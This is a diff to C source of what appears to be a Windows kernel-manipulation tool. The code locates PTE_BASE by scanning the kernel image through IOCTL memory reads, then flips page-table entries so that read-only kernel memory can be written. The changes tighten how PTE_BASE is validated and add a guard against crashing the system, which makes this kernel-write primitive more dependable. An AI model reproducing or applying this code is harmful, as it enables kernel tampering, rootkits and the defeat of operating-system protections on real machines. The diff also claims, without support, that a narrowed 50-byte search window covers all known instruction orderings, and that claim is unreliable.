@@ -1773,7 +1773,7 @@ static BOOL KM_LooksLikePteBase(ULONG64 v) {
  * Anchor: any REX.W SAR/SHR r64, 9  — bits: (48|49) C1 (E8-EF|F8-FF) 09
  *   This is the only instruction needed to compute a PTE index from a VA and appears
  *   at the start of MiGetPteAddress on every known x64 Windows 10/11 build.
- *   Searching 160 bytes both before and after the anchor covers all known orderings.
+ *   Searching 50 bytes both before and after the anchor covers all known orderings.
  *
  * Two value-encoding variants handled:
  *   A) REX.W MOV Rn, imm64  — PTE_BASE baked directly into the instruction
@@ -1803,7 +1803,7 @@ static ULONG64 KM_ScanKernelImageForPteBase(void) {
     ULONG64 pteBase = 0;
 
     const DWORD CHUNK   = 0x8000;  /* 32 KB per IOCTL */
-    const DWORD OVERLAP = 200;     /* bytes backed-up between chunks (covers 160-byte window) */
+    const DWORD OVERLAP = 60;      /* bytes backed-up between chunks (covers 50-byte window) */
     BYTE* buf = (BYTE*)malloc(CHUNK);
     if (!buf) return 0;
 
@@ -1838,9 +1838,9 @@ static ULONG64 KM_ScanKernelImageForPteBase(void) {
                 if (b0 != 0x48 && b0 != 0x49) continue;
                 if (!((b2 >= 0xE8 && b2 <= 0xEF) || (b2 >= 0xF8 && b2 <= 0xFF))) continue;
 
-                /* Search window: 160 bytes before anchor + 160 bytes after */
-                DWORD wstart = (j >= 160) ? j - 160 : 0;
-                DWORD wend   = j + 4 + 160;
+                /* Search window: 50 bytes before anchor + 50 bytes after */
+                DWORD wstart = (j >= 50) ? j - 50 : 0;
+                DWORD wend   = j + 4 + 50;
                 if (wend > rdSz) wend = rdSz;
 
                 DWORD k;
@@ -1961,6 +1961,13 @@ static BOOL KM_TryKernelVaWritableFlip(ULONG64 pteBase, ULONG64 kernelAddr, PVOI
 
         if (!KM_IsCanonicalKernelVa(slot))
             continue;
+        /* PDE slot must lie in the expected PDE range [PTE_BASE-512MB, PTE_BASE).
+           If it falls outside, PTE_BASE is wrong — abort rather than read an
+           unmapped kernel address and take a BSOD. */
+        if (si == 1 && (slot >= pteBase || slot < pteBase - 0x80000000ULL)) {
+            DbgLog("  PteFlip[PDE]: slot 0x%llX outside valid PDE range — PTE_BASE likely wrong, aborting", slot);
+            break;
+        }
         DbgLog("  PteFlip[%s]: reading slot=0x%llX", names[si], slot);
         if (!KM_ReadKernelMemory(slot, &old, sizeof(old))) {
             DbgLog("  PteFlip[%s]: slot read FAILED (DeviceIoControl error)", names[si]);
@@ -2054,12 +2061,22 @@ BOOL KM_WriteToReadOnlyMemory(ULONG64 kernelAddr, PVOID buffer, SIZE_T size) {
     {
         ULONG64 pteBase = KM_ScanKernelImageForPteBase();
         if (pteBase) {
-            /* Validate: PTE for g_KernelBase must be present (bit 0) when PTE_BASE is correct */
-            ULONG64 kbasePte = pteBase + (((LONG64)(ULONG64)g_KernelBase >> 9) & 0x7FFFFFFFF8);
-            ULONG64 kbasePteVal = 0;
+            /* Validate PTE_BASE using consecutive PFN check:
+               PTEs for g_KernelBase and g_KernelBase+0x1000 must both be present AND
+               have consecutive PFNs (adjacent kernel image pages are physically adjacent).
+               A single present-bit check is not enough — kernel PE headers start with
+               0x4D ('M') which has bit 0 = 1, causing false positives. */
+            ULONG64 kbasePte  = pteBase + (((LONG64)(ULONG64)g_KernelBase >> 9) & 0x7FFFFFFFF8);
+            ULONG64 kbasePte2 = pteBase + (((LONG64)((ULONG64)g_KernelBase + 0x1000) >> 9) & 0x7FFFFFFFF8);
+            ULONG64 kbasePteVal = 0, kbasePteVal2 = 0;
             BOOL valid = KM_IsCanonicalKernelVa(kbasePte) &&
-                         KM_ReadKernelMemory(kbasePte, &kbasePteVal, sizeof(kbasePteVal)) &&
-                         (kbasePteVal & 1);
+                         KM_IsCanonicalKernelVa(kbasePte2) &&
+                         KM_ReadKernelMemory(kbasePte,  &kbasePteVal,  sizeof(kbasePteVal)) &&
+                         KM_ReadKernelMemory(kbasePte2, &kbasePteVal2, sizeof(kbasePteVal2)) &&
+                         (kbasePteVal & 1) && (kbasePteVal2 & 1) &&
+                         /* Consecutive virtual pages must have consecutive PFNs */
+                         (((kbasePteVal2 >> 12) & 0xFFFFFFFFFULL) ==
+                          ((kbasePteVal  >> 12) & 0xFFFFFFFFFULL) + 1);
             if (valid) {
                 DbgLog("  WriteToReadOnly: PTE_BASE=0x%llX (kernel scan, kbasePTE=0x%llX val=0x%llX)",
                     pteBase, kbasePte, kbasePteVal);
@@ -2067,8 +2084,8 @@ BOOL KM_WriteToReadOnlyMemory(ULONG64 kernelAddr, PVOID buffer, SIZE_T size) {
                     return TRUE;
                 DbgLog("  WriteToReadOnly: kernel PTE_BASE flip inconclusive, continuing");
             } else {
-                DbgLog("  WriteToReadOnly: PTE_BASE=0x%llX failed validation (kbasePte=0x%llX val=0x%llX)",
-                    pteBase, kbasePte, kbasePteVal);
+                DbgLog("  WriteToReadOnly: PTE_BASE=0x%llX failed consecutive-PFN validation (p1=0x%llX p2=0x%llX)",
+                    pteBase, kbasePteVal, kbasePteVal2);
             }
         } else {
             DbgLog("  WriteToReadOnly: kernel image PTE_BASE scan found no match");
